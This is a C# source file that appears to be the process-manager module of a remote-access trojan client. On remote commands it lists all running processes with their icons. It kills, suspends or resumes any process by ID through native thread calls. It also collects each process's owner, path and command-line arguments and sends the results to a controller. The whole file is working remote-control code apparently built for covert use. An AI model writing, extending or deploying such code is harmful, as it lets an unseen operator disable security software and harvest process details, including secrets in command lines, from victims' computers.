using Client.Connection;
using Client.Things;
using Stuff;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace Client.Handlers
{
    internal class HandleProcessManager
    {
        public void Run(Unpack unpack)
        {
            try
            {
                int processId = unpack.GetAsInteger("ProcessId");
                switch (unpack.GetAsString("Command"))
                {
                    case "List":
                        {
                            GetProcesses();
                            break;
                        }
                    case "Kill":
                        {
                            Controls(Option.Kill, processId);
                            break;
                        }
                    case "Pause":
                        {
                            Controls(Option.Pause, processId);
                            break;
                        }
                    case "Resume":
                        {
                            Controls(Option.Resume, processId);
                            break;
                        }
                    case "Info":
                        {
                            GetInfo(processId);
                            break;
                        }
                }
            }
            catch (Exception) {  }
        }
        public enum Option
        {
            Kill,
            Pause,
            Resume
        }
        public void Controls(Option option, int processId)
        {
            Process process = Process.GetProcessById(processId);
            switch (option)
            {
                case Option.Kill:
                    {
                        process.Kill();
                        break;
                    }
                case Option.Pause:
                    {
                        Pause(process);
                        break;
                    }
                case Option.Resume:
                    {
                        Resume(process);
                        break;
                    }
            }
        }
        public void GetProcesses()
        {
            StringBuilder str = new StringBuilder();
            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bool iconOk = false;
                        try
                        {
                            uint nChars = 256;
                            StringBuilder Buff = new StringBuilder((int)nChars);
                            if (QueryFullProcessImageName(process.Handle, 0, Buff, out nChars) != 0)
                            {
                                GetIcon(Buff.ToString()).Save(ms, ImageFormat.Png);
                                iconOk = true;
                            }
                        }
                        catch { iconOk = false; }
                        str.AppendLine(process.ProcessName + "-=>" + process.Id.ToString() + "-=>" + (process.MainWindowHandle == IntPtr.Zero ? "Background" : "Foreground") + "-=>" + (process.Responding == true ? "Responding" : "Not responding") + "-=>" + (iconOk ? Convert.ToBase64String(ms.ToArray()) : "N/A") + "-=>");
                    }
                }
                catch { continue; }
            }
            Pack unpack = new Pack();
            unpack.Set("Packet", "ProcessSpy");
            unpack.Set("Command", "List");
            unpack.Set("UID", UID.Get());
            unpack.Set("Processes", str.ToString());
            SillyClient.Send(unpack.Pacc());
        }
        private static Bitmap GetIcon(string file)
        {
            try
            {
                if (file.EndsWith("jpg") || file.EndsWith("jpeg") || file.EndsWith("gif") || file.EndsWith("png") || file.EndsWith("bmp"))
                {
                    using (Bitmap myBitmap = new Bitmap(file))
                    {
                        return new Bitmap(myBitmap.GetThumbnailImage(48, 48, new Image.GetThumbnailImageAbort(() => false), IntPtr.Zero));
                    }
                }
                else
                    using (Icon icon = Icon.ExtractAssociatedIcon(file))
                    {
                        return icon.ToBitmap();
                    }
            }
            catch
            {
                return new Bitmap(48, 48);
            }
        }
        public static void Pause(Process process)
        {
            foreach (ProcessThread thread in process.Threads)
            {
                var pOpenThread = OpenThread(ThreadAccess.SUSPEND_RESUME, false, (uint)thread.Id);
                if (pOpenThread == IntPtr.Zero)
                {
                    break;
                }
                SuspendThread(pOpenThread);
            }
        }
        public static void Resume(Process process)
        {
            foreach (ProcessThread thread in process.Threads)
            {
                var pOpenThread = OpenThread(ThreadAccess.SUSPEND_RESUME, false, (uint)thread.Id);
                if (pOpenThread == IntPtr.Zero)
                {
                    break;
                }
                ResumeThread(pOpenThread);
            }
        }
        public void GetInfo(int processId)
        {
            Pack unpack = new Pack();
            unpack.Set("Packet", "ProcessSpy");
            unpack.Set("Command", "Info");
            unpack.Set("UID", UID.Get());
            Process process = Process.GetProcessById(processId);
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine("Name: " + process.ProcessName);
            stringBuilder.AppendLine("ID: " + process.Id);
            stringBuilder.AppendLine("Title: " + (!string.IsNullOrEmpty(process.MainWindowTitle) ? process.MainWindowTitle : "N/A"));
            stringBuilder.AppendLine("Window: " + (process.MainWindowHandle == IntPtr.Zero ? "Background" : "Foreground"));
            stringBuilder.AppendLine("Status: " + (process.Responding == true ? "Responding" : "Not responding"));
            stringBuilder.AppendLine("Code: " + IsCLRLoaded(process));
            stringBuilder.AppendLine("UID: " + UID.Get());
            try
            {
                stringBuilder.AppendLine("Priority: " + process.PriorityClass);
                stringBuilder.AppendLine("Owner: " + GetProcessUser(process));
                stringBuilder.AppendLine("Bit: " + Bit(process));
                stringBuilder.AppendLine("Handle: " + process.Handle);
                using (MemoryStream ms = new MemoryStream())
                {
                    uint nChars = 256;
                    StringBuilder Buff = new StringBuilder((int)nChars);
                    if (QueryFullProcessImageName(process.Handle, 0, Buff, out nChars) != 0)
                    {
                        stringBuilder.AppendLine("Company: " + FileVersionInfo.GetVersionInfo(Buff.ToString()).CompanyName);
                        stringBuilder.AppendLine("Path: " + Buff.ToString());
                        stringBuilder.AppendLine("Description: " + FileVersionInfo.GetVersionInfo(Buff.ToString()).FileDescription);
                        GetIcon(Buff.ToString()).Save(ms, ImageFormat.Png);
                        unpack.Set("Icon", ms.ToArray());
                    }
                }
                stringBuilder.AppendLine("Argument: " + GetCommandLine(process));
            }
            catch
            {
                stringBuilder.AppendLine("You can't access to more details without administrator.");
            }
            unpack.Set("Data", stringBuilder.ToString());
            unpack.Set("ProcessName", process.ProcessName);
            unpack.Set("ProcessId", process.Id.ToString());
            SillyClient.Send(unpack.Pacc());
        }
        public static string GetCommandLine(Process process)
        {
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT CommandLine FROM Win32_Process WHERE ProcessId = " + process.Id))
            using (ManagementObjectCollection objects = searcher.Get())
            {
                return objects.Cast<ManagementBaseObject>().SingleOrDefault()?["CommandLine"]?.ToString();
            }

        }
        public static string GetProcessUser(Process process)
        {
            var processHandle = IntPtr.Zero;
            try
            {
                OpenProcessToken(process.Handle, 8, out processHandle);
                var wi = new WindowsIdentity(processHandle);
                return wi.Name;
            }
            catch
            {
                return null;
            }
            finally
            {
                if (processHandle != IntPtr.Zero) CloseHandle(processHandle);
            }
        }
        public static string Bit(Process process)
        {
            if (Is64Bit())
            {
                IntPtr processHandle;

                try
                {
                    processHandle = Process.GetProcessById(process.Id).Handle;
                }
                catch
                {
                    return "*";
                }

                return IsWow64Process(processHandle, out var retVal) && retVal ? "x86" : "x64";
            }

            return "x86";
        }
        public static bool Is64Bit()
        {
            if (IntPtr.Size == 8)
                return true;

            bool is64Bit;
            if (IsWow64Process(GetCurrentProcess(), out is64Bit))
            {
                return is64Bit;
            }
            else { return false; }
        }
        public static string IsCLRLoaded(Process process)
        {
            try
            {
                var modules = from module in process.Modules.OfType<ProcessModule>()
                              select module;

                return modules.Any(pm => pm.ModuleName.Contains("mscor")) ? "Manage" : "Native";
            }
            //Access was denied
            catch (Win32Exception)
            {
                return "Native";
            }
            //Process has already exited
            catch (InvalidOperationException)
            {
                return "Native";
            }
        }
        #region Native Method's
        [DllImport("kernel32")]
        public static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll")]
        public static extern bool IsWow64Process(IntPtr hProcess, out bool lpSystemInfo);
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(
                             IntPtr ProcessHandle,
                             uint DesiredAccess,
                             out IntPtr TokenHandle);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200)
        }
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32.dll")]
        static extern uint SuspendThread(IntPtr hThread);
        [DllImport("kernel32.dll")]
        static extern int ResumeThread(IntPtr hThread);
        [DllImport("Kernel32.dll")]
        static extern uint QueryFullProcessImageName(IntPtr hProcess, uint flags, StringBuilder text, out uint size);


        #endregion
    }
}
